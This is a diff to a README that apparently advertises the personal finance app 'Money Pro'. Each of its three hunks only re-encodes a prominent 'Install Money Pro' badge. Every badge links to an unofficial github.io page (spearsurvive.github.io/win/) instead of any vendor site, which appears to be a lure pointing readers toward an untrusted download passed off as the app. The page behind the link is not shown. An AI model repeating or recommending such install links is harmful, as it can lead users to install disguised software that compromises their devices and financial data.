@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Money Pro](https://img.shields.io/badge/⬇_Install_Money%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Money Pro](https://img.shields.io/badge/⬇_Install_Money+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Money Pro is a multi-platform personal finance app covering budgets, bills, and 
 
 <div align="center">
 
-[![⬇ Install Money Pro](https://img.shields.io/badge/⬇_Install_Money%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Money Pro](https://img.shields.io/badge/⬇_Install_Money+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Money Pro is a multi-platform personal finance app covering budgets, bills, and 
 
 <div align="center">
 
-[![⬇ Install Money Pro](https://img.shields.io/badge/⬇_Install_Money%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Money Pro](https://img.shields.io/badge/⬇_Install_Money+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
